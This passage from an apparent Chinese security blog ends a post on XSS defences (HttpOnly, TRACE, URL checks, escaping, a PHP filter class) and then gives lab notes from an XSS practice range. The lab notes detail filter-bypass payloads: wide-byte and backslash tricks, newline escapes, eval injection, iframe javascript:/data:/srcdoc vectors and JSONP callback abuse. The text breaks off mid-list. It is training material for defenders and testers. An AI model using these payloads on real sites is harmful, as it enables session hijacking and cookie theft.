<li>Cookie中有名为HttpOnly的属性，该属性能禁止JavaScript读取Cookie值</li>
<li>php.ini中进行设置：session.cookie_httponly = on</li>
</ul>
</li>
<li>关闭TRACE方法<ul>
<li>跨站追踪（Cross-Site Tracing，简称XST）攻击的防范策略。XST是指利用JavaScript发送HTTP的TRACE方法来窃取Cookie值或Basic认证密码的攻击手段</li>
<li>实际上，现在的主流浏览器都已经能够自己防御XST</li>
<li>关闭TRACE方法，在httpd.conf的设置 TraceEnable Off</li>
</ul>
</li>
<li>生成URL时的对策<ul>
<li>当URL由程序动态生成时，需要对其进行校验，仅允许http和https协议</li>
<li>URL需满足下列的两个条件中的一个<ul>
<li>以http:或https:开头的绝对URL</li>
<li>以/开头的相对URL</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function check_url($url)&#123;</span><br><span class="line">    if(preg_match(&apos;/\Ahttp:/&apos;,$url)||preg_match(&apos;/\Ahttps:/&apos;,$url)|preg_match(&apos;#\A/#&apos;,$url))&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>校验链接网址<ul>
<li>检查链接的目标URL，如果指向外部网站就报错</li>
<li>当链接目标为外部URL时，显示一个警告页面以提醒用户可能存在的分享</li>
</ul>
</li>
<li>对JavaScript字符串字面量动态生成进行Unicode转义<ul>
<li>JavaScript能将Unicode代码点U+XXXX字符转义为\uXXXX的功能</li>
<li>escape_js_string函数，但前提是字符编码为UTF-8，除了字母和数字以外，减号（-）和点好（.）也不进行转义</li>
<li>unicode_escape函数的功能将输入字符串全部以\uXXXX的UNICODE形式进行转义</li>
<li>在mb_convert_encoding中将输入字符串的字符编码转换为UTF-16</li>
<li>在bin2hex中将对象字符串转换为十六进制</li>
<li>使用正则表达式，每4个字节插入一个\u</li>
<li>在pre_replace_callback函数中，将字母和数字以外的字符串全部传给unicode_escape函数处理</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">   // 将字符串全部转换为 /uXXXX形式</span><br><span class="line">   function unicode_escape($match)&#123;</span><br><span class="line">      $u16 = mb_convert_encoding($matches[0],&apos;UTF-16&apos;);</span><br><span class="line">      return preg_replace(&apos;/[0-9a-f]&#123;4&#125;&apos;,&apos;\u$0&apos;,bin2hex($u16));</span><br><span class="line">   &#125;</span><br><span class="line">   // 将除了字母、数字、逗号和点号外的字符转义为\uXXXX形式</span><br><span class="line">   function escape_js_string($s)&#123;</span><br><span class="line">      return preg_replace_callback(&apos;/[^-\.0-9a-zA-Z]+/u&apos;,&apos;unicode_escape&apos;,$s);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>在JavaScript中引用定义在script元素外的参数的方法<ul>
<li>在script元素外部定义参数后再在JavaScript中引用该参数也可以，不过需要利用hidden参数</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; id=&quot;familyname&quot; value=&quot;&lt;?php echo htmlspecialchars($familyname,ENT_COMPAR,&apos;UTF-8&apos;);?&gt;&quot;&gt;</span><br><span class="line">.....</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">var familyname = documen.getElementById(&apos;familyname&apos;).value;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<ul>
<li>使用JQuery的JavaScript库来对JavaScript字符串字面量动态生成进行转义<ul>
<li>使用span元素确定字符串的显示位置，然后向id指定的DOM插入文本文字，这时可以使用text方法自动进行转义操作</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;jquery-1.4.4.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">你好&lt;span id=&quot;name&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">if(document.URL.match(/name\=([^&amp;]*)/))&#123;</span><br><span class="line">    var name = unescape(RegExp.$1);</span><br><span class="line">    $(&apos;#name&apos;).text(name);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>允许HTML标签或CSS的对策<ul>
<li>使用地点：常见于开发博客系统或SNS网站</li>
<li>一旦允许输入HTML标签，就有可能出现JavaScript的执行</li>
<li>在CSS中使用expression功能也能执行JavaScript<ul>
<li>IE8的标准中就禁用了expression功能执行JavaScript，但在其他模式中还可以使用</li>
</ul>
</li>
<li>为了避免JavaScript的执行，可以采取解析用户输入的HTML，仅允许可以显示的元素的方法，可以通过解析HTML文本语法结构的第三方程序库，如PHP的HTML Purifier</li>
</ul>
</li>
</ul>
<h4 id="2-常见的防XSS代码"><a href="#2-常见的防XSS代码" class="headerlink" title="2. 常见的防XSS代码"></a>2. 常见的防XSS代码</h4><ul>
<li><code>preg_replace(&quot;/script/&quot;,&quot;&quot;,$x)</code> -&gt; 正则匹配替换，区分大小写</li>
<li><code>preg_replace(&quot;/script/i&quot;,&quot;&quot;,$x)</code> -&gt; 正则匹配替换，不区分大小写</li>
<li><code>preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code> -&gt; 正则匹配替换</li>
<li>htmlspecialchars()函数 -&gt; 默认的第二个参数不对单引号进行转义</li>
<li>strtolower()函数 -&gt; 将字符串转为小写</li>
<li>strpos()函数 -&gt; 找寻字符串<ul>
<li><code>strpos($str,&#39;http://&#39;)</code></li>
<li><code>strpos($str,&#39;https://&#39;)</code></li>
</ul>
</li>
<li>str_replace()函数 -&gt; 第一个参数为被替换的内容，第二个参数为替换的内容<ul>
<li><code>str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str)</code></li>
<li><code>str_replace(&quot;on&quot;,&quot;o_n&quot;,$str)</code></li>
<li><code>str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str)</code></li>
<li><code>str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str)</code></li>
<li><code>str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str)</code></li>
<li><code>str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str)</code></li>
<li><code>str_replace(&quot;script&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&quot;on&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&quot;src&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&quot;data&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&quot;href&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str)</code></li>
<li><code>str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
<li><code>str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
<li><code>str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
<li><code>str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str)</code></li>
<li><code>str_replace(&quot;&gt;&quot;,&quot;&quot;,$str)</code></li>
<li><code>str_replace(&quot;&lt;&quot;,&quot;&quot;,$str)</code></li>
</ul>
</li>
<li>hidden表单形式</li>
<li>addslashes()函数 -&gt; 在每个特殊字符前加反斜杠（\）</li>
<li>strip_tags()函数 -&gt; 剥去字符串中的 HTML、XML以及PHP的标签</li>
<li>stripos()函数 -&gt; 查找字符串在另一字符串中第一次出现的位置，本函数处于循环中，意味着每一个<code>&lt;script</code>都会被替换，且不区分大小写</li>
<li>stripcslashes() -&gt; 去掉反斜杠</li>
<li>htmlentities() -&gt; 转义html实体</li>
<li>html_entity_decode() -&gt; 反转义html实体</li>
<li>htmlspecialchars_decode() -&gt; 将特殊的 HTML 实体转换回普通字符</li>
<li>▲ 白嫖一下bmjoker写的数据过滤类（PHP）<ul>
<li><a href="https://www.cnblogs.com/bmjoker/p/8806899.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/8806899.html</a></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class XSS</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">    * @desc 过滤数据</span><br><span class="line">    *</span><br><span class="line">    * @param $data string|array 输入数据</span><br><span class="line">    * @param $low  bool      是否采用更为严格的过滤</span><br><span class="line">    *</span><br><span class="line">    * @return 返回过滤的数据</span><br><span class="line">    */</span><br><span class="line">    public function clean_xss($data, $low = False)</span><br><span class="line">    &#123;</span><br><span class="line">        #字符串过滤</span><br><span class="line">       if (! is_array ( $data ))</span><br><span class="line">       &#123;</span><br><span class="line">           $data = trim ( $data );              #字符两边的处理</span><br><span class="line">           $data = strip_tags ( $data );        #从字符串中去除 HTML 和 PHP 标记</span><br><span class="line">           $data = htmlspecialchars ( $data );  #特殊字符转换为HTML实体</span><br><span class="line">           if ($low)</span><br><span class="line">           &#123;</span><br><span class="line">               return $data;</span><br><span class="line">           &#125;</span><br><span class="line">           #匹配换空格</span><br><span class="line">           $data = str_replace ( array (&apos;&quot;&apos;, &quot;\\&quot;, &quot;&apos;&quot;, &quot;/&quot;, &quot;..&quot;, &quot;../&quot;, &quot;./&quot;, &quot;//&quot; ), &apos;&apos;, $data );</span><br><span class="line">           $no = &apos;/%0[0-8bcef]/&apos;;</span><br><span class="line">           $data = preg_replace ( $no, &apos;&apos;, $data );</span><br><span class="line">           $no = &apos;/%1[0-9a-f]/&apos;;</span><br><span class="line">           $data = preg_replace ( $no, &apos;&apos;, $data );</span><br><span class="line">           $no = &apos;/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S&apos;;</span><br><span class="line">           $data = preg_replace ( $no, &apos;&apos;, $data );</span><br><span class="line">           return $data;</span><br><span class="line">       &#125;</span><br><span class="line">       #数组过滤</span><br><span class="line">       $arr=array();</span><br><span class="line">       foreach ($data as $k =&gt; $v)</span><br><span class="line">       &#123;</span><br><span class="line">           $temp=$this-&gt;clean_xss($v);</span><br><span class="line">           $arr[$k]=$temp;</span><br><span class="line">       &#125;</span><br><span class="line">       return $arr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">#测试测试</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;xss&apos;]=&apos;xssss&apos;;</span><br><span class="line">$xss=new XSS();</span><br><span class="line">#测试字符串</span><br><span class="line">$str = &quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;;</span><br><span class="line">echo $str;</span><br><span class="line">$str2=$xss-&gt;clean_xss($str);</span><br><span class="line">echo $str2;</span><br><span class="line">echo &quot;&lt;hr/&gt;&quot;;</span><br><span class="line">#测试数组</span><br><span class="line">$arr=array(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;,&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;,&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($arr);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">$arr2=$xss-&gt;clean_xss($arr);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($arr2);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;die;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS%E9%9D%B6%E5%9C%BA--WooYun.tencent/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/XSS%E9%9D%B6%E5%9C%BA--WooYun.tencent/" itemprop="url">XSS靶场--Wooyun.tencent</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2.6k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  10 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-什么都没过滤的入门情况"><a href="#1-什么都没过滤的入门情况" class="headerlink" title="1. 什么都没过滤的入门情况"></a>1. 什么都没过滤的入门情况</h4><ul>
<li>XSS的存在，一定是伴随着输入，与输出2个概念的。</li>
</ul>
<h4 id="2-输出在-lt-script-gt-lt-script-gt-之间的情况"><a href="#2-输出在-lt-script-gt-lt-script-gt-之间的情况" class="headerlink" title="2. 输出在&lt;script&gt;&lt;/script&gt;之间的情况"></a>2. 输出在<code>&lt;script&gt;&lt;/script&gt;</code>之间的情况</h4><ul>
<li>如果过滤了<code>&lt;&gt;</code>，就无法构造<code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>可通过js代码eval(‘alert(1)’);voids来进入绕过</li>
</ul>
<h4 id="3-输出在HTML属性里的情况"><a href="#3-输出在HTML属性里的情况" class="headerlink" title="3. 输出在HTML属性里的情况"></a>3. 输出在HTML属性里的情况</h4><ul>
<li>\ 反斜线，而 css里，允许使用转义字符，\ + ascii16进制形式<ul>
<li>expression, 我们也可以轻松的用expr\65ssion绕过</li>
<li>▲ css expression 的XSS已经进入暮年了，只有在IE6，7下方能触发，受众面小</li>
</ul>
</li>
<li>在HTML属性中，会自动对实体字符进行转义<ul>
<li><code>&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;</code>和<code>&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;</code>是等效的</li>
<li>url 的编码，&amp;-&gt; %26, # -&gt; %23</li>
</ul>
</li>
</ul>
<h4 id="4-宽字节复仇记-QQ邮箱基本通用"><a href="#4-宽字节复仇记-QQ邮箱基本通用" class="headerlink" title="4. 宽字节复仇记 [QQ邮箱基本通用]"></a>4. 宽字节复仇记 [QQ邮箱基本通用]</h4><ul>
<li>前提<ul>
<li>2中<code>&lt;script&gt;..&lt;/script&gt;</code>之间的情况</li>
<li>gbxxxx系列的编码</li>
</ul>
</li>
<li>过滤：%22 -&gt; %5c%22<ul>
<li>%c0%22 -&gt; %c0%5c%22 -&gt; %22 -&gt; %c0%22</li>
</ul>
</li>
</ul>
<h4 id="5-反斜线复仇记"><a href="#5-反斜线复仇记" class="headerlink" title="5. 反斜线复仇记"></a>5. 反斜线复仇记</h4><ul>
<li>前提<ul>
<li>2中<code>&lt;script&gt;..&lt;/script&gt;</code>之间的情况</li>
</ul>
</li>
<li>绕过转换<ul>
<li>location.href=”………”+”&amp;ss=aaaa”+”&amp;from=bbb”+”&amp;param=”;</li>
<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from=bbb”+”&amp;param=”;（\杀掉双引号）</li>
<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from=1//“+”&amp;param=”;（保证bbb后面的语法正确性，我们把bbb改为一个数字，把bbb后面加上 // 来注释掉后面的部分，但是是错误的，因为&amp;符号优先级高，(“字符串”&amp;from)=1是无法进行这种赋值操作的）</li>
<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1//“+”&amp;param=”;（==的优先级比 &amp; 高，所以语句相当于 (“字符串”)&amp;(from==1)，但由于from未定义，直接和1进行相等判断的话，会报错，错误是：”from”未定义等）</li>
<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1;function from(){}//“+”&amp;param=”;（解析器在解析JS代码段时，会先将 function xxx(){} 拿到最前面解析，然后再依次解析其它的部分，function from(){} 就会被提前解析，从而定义了from, 后面 from==1的时候，就不会报错）</li>
<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1;function/<strong>/from(){}//“+”&amp;param=”;（空格被转义为了 &amp;nbsp，但可以用注释符来做分隔符，`/</strong>/`替换空格，）</li>
<li>最终代码：location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1;function/**/from(){}//“+”&amp;param=”;</li>
</ul>
</li>
</ul>
<h4 id="6-换行符复仇记"><a href="#6-换行符复仇记" class="headerlink" title="6. 换行符复仇记"></a>6. 换行符复仇记</h4><ul>
<li>前提<ul>
<li>2中<code>&lt;script&gt;..&lt;/script&gt;</code>之间的情况</li>
</ul>
</li>
<li>源码：//我是注释，我爱洗澡，哦～哦～哦～ [我是输出]</li>
<li>使用换行符：//我是注释，我爱洗澡，哦～哦～哦～ [我是输出  换行符 alert(1);//我是输出]</li>
</ul>
<h4 id="7-宽字节、反斜线与换行符一起复仇记"><a href="#7-宽字节、反斜线与换行符一起复仇记" class="headerlink" title="7. 宽字节、反斜线与换行符一起复仇记"></a>7. 宽字节、反斜线与换行符一起复仇记</h4><ul>
<li>注释 -&gt; 换行输出</li>
<li>\ -&gt; javascript，字符串允许下面多行的写法，可以用\来使进行多行输出</li>
<li>\ -&gt; 转义：\ -&gt; gbxxx编码系列 -&gt;  %c0可以吃掉%5c</li>
<li>▲ 具体见代码实例，只能说tql</li>
</ul>
<h4 id="8-Dom-Xss入门-显式输出"><a href="#8-Dom-Xss入门-显式输出" class="headerlink" title="8. Dom Xss入门 [显式输出]"></a>8. Dom Xss入门 [显式输出]</h4><ul>
<li>关注点：关注的不仅是【输出】了什么，还要了解这个页面里，【javascript】拿这个【输出】干了什么</li>
<li>JS的字符串中的字符可以写为 unicode编码<ul>
<li>&lt;可以表示为\u003c , &gt;可以表示为\u003e，空格可以表示为\u0020</li>
<li>在JS字符串里，&lt;不光可以写为\u003c，还可以写为\x3c，&gt;同样可以写为\x3e</li>
</ul>
</li>
<li>常用的js代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;y&quot;).innerHTML=&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">document.write(&quot;xxxxxxxxxxxx&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>使用了第三方的JS库，譬如jQuery时</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;#y&quot;).html(&quot;xxxxxxx&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>需要注意的地方<ul>
<li>xxxxx只能使用<code>&lt;img src=1 onerror=alert(1)&gt;</code>这种方式来触发JS。而不能以<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>来触发，因为这种压根不会执行<code>&lt;script&gt;..&lt;/script&gt;</code>之间的内容。 IE下，可以使用<code>&lt;script defer&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa.innerHTML=&quot;xxxxxxxxxxxx&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="9-Dom-Xss入门-隐式输出"><a href="#9-Dom-Xss入门-隐式输出" class="headerlink" title="9. Dom Xss入门 [隐式输出]"></a>9. Dom Xss入门 [隐式输出]</h4><ul>
<li>显示输出：可以在右键查看源代码的时候，看到我们所输出的内容</li>
<li>隐式输出：ar x=location.href; 这句Javascript实际上进行了一个隐藏的输出操作，即将location.href的内容输出到了x变量中</li>
<li>对隐式输出的审查方式：F12 -&gt; 调试工具 -&gt; Source -&gt; crtl+F搜索name或id值</li>
<li>分析js代码的流程，可能不同浏览器对location.href的字符的编码过滤不同<ul>
<li>可能浏览器对代码的编码使得特殊字符绕过了服务器的过滤从而触发了XSS</li>
</ul>
</li>
</ul>
<h4 id="10-Dom-XSS进阶-邂逅eval"><a href="#10-Dom-XSS进阶-邂逅eval" class="headerlink" title="10. Dom XSS进阶[邂逅eval]"></a>10. Dom XSS进阶[邂逅eval]</h4><ul>
<li>一般javascript都会通过document.write或innerHTML将内容输出到网页中，也有可能通过eval输出</li>
<li>▲ 一般eval进行输出的，源代码和审查元素很难看出来，只有触发错误，在console台的错误输出才有可能发现</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url中为：?key=aaa</span><br><span class="line">源代码中为：eval(&apos;this.&apos;+arg[0]&apos;=&quot;&apos;+arg[1]+&apos;&quot;;&apos;);</span><br><span class="line">输出为：this.key=&quot;aaa&quot;</span><br><span class="line">构造payload：key;alert(1);//=aaa</span><br><span class="line">输出为：this.key;alert(1);//=&quot;aaaa&quot;（如果遇上对&lt;&gt;&quot;编码的话，就不能对后面替换绕过）</span><br></pre></td></tr></table></figure>

<h4 id="11-Dom-XSS进阶-善变iframe"><a href="#11-Dom-XSS进阶-善变iframe" class="headerlink" title="11. Dom XSS进阶[善变iframe]"></a>11. Dom XSS进阶[善变iframe]</h4><ul>
<li>有时候，输出还会出现在<code>&lt;iframe src=&quot;[输出]&quot;&gt;&lt;/iframe&gt;</code>。 iframe的src属性本来应该是一个网址，但是iframe之善变，使得它同样可以执行javascript，而且可以用不同的姿势来执行</li>
<li>这一类问题，将其归为[路径可控]问题，当然上面说到的是普通的反射型XSS</li>
<li>有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src=”[可控的url]”; 同样会导致XSS问题</li>
<li>iframe的变化<ul>
<li>onload执行js：<code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>src 执行javascript代码：<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>IE下vbscript执行代码：<code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;</code></li>
<li>Chrome下data协议执行代码：<code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; Chrome</code></li>
<li>上面的变体：<code>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
<li>Chrome下srcdoc属性：<code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
</ul>
</li>
</ul>
<h4 id="12-Dom-XSS进阶-路径con"><a href="#12-Dom-XSS进阶-路径con" class="headerlink" title="12. Dom XSS进阶[路径con]"></a>12. Dom XSS进阶[路径con]</h4><ul>
<li>一些程序员会动态的加载json数据，同域的时候，可以使用ajax</li>
<li>有时候，数据所在域和当前页面所在域又不一致，跨域请求数据的手段中，有一种叫做jsonp</li>
<li>代码表示：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&quot;</code></li>
<li>可控参数：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&amp;id=&quot;+id;</code></li>
<li>地址的可控<ul>
<li>script src=”完全可控” ,这种就简单了，直接将地址换为我们的JS地址</li>
<li>script src=”/path/xxx/[路径可控]/1.js”<ul>
<li>可以直接上传文本至同域名下，不一定要是HTML文件，需要上传点有过滤缺陷。</li>
<li>参数可控，利用可用的json接口（script src=”/path/xxx/…/yyy/xx.json?callback=alert(1)”）</li>
</ul>
</li>
<li>script src=”/xxxx/json.php?callback=xxxx&amp;param1=yyy&amp;param2=[参数可控]”情况与地址可控的第二点参数可控类似</li>
</ul>
</li>
<li>decodeURIComp -&gt; 解码进行<ul>
<li>keyword=%26callback=alert(1);</li>
<li>decodeURIComp就会变为</li>
<li>&amp;callback=alert(1);</li>
</ul>
</li>
</ul>
<h4 id="13-Dom-XSS实例-Discuz-X2-5"><a href="#13-Dom-XSS实例-Discuz-X2-5" class="headerlink" title="13. Dom XSS实例[Discuz X2.5]"></a>13. Dom XSS实例[Discuz X2.5]</h4><ul>
<li>js中，代码可以进行unicode编码，所以需要过滤\</li>
<li>html中，代码可以进行html实体编码，所以需要过滤&amp;#</li>
<li>▲ location.href=”脚本” -&gt; location.href会优先加载”脚本”地址，从而跳转到另外一个页面，继而倒是失效，js文件还没来得及加载，可以改进下执行js的方法： location.href=’原来的字符串’.替换(所有字符,”新的字符”);</li>
<li>▲ alert函数可以改写成：location.href=”javascript:alert(document.cookie)”;</li>
</ul>
<h4 id="14-Flash-Xss入门-navigateToURL"><a href="#14-Flash-Xss入门-navigateToURL" class="headerlink" title="14. Flash Xss入门 [navigateToURL]"></a>14. Flash Xss入门 [navigateToURL]</h4><h4 id="15-Flash-Xss进阶-ExternalInterface-call第一个参数"><a href="#15-Flash-Xss进阶-ExternalInterface-call第一个参数" class="headerlink" title="15. Flash Xss进阶 [ExternalInterface.call第一个参数]"></a>15. Flash Xss进阶 [ExternalInterface.call第一个参数]</h4><h4 id="16-Flash-Xss进阶-ExternalInterface-call第二个参数"><a href="#16-Flash-Xss进阶-ExternalInterface-call第二个参数" class="headerlink" title="16. Flash Xss进阶 [ExternalInterface.call第二个参数]"></a>16. Flash Xss进阶 [ExternalInterface.call第二个参数]</h4><h4 id="17-XSS过滤器绕过-通用绕过"><a href="#17-XSS过滤器绕过-通用绕过" class="headerlink" title="17. XSS过滤器绕过 [通用绕过]"></a>17. XSS过滤器绕过 [通用绕过]</h4><ul>
<li>查看是否被浏览器拦截 -&gt; chrome<ul>
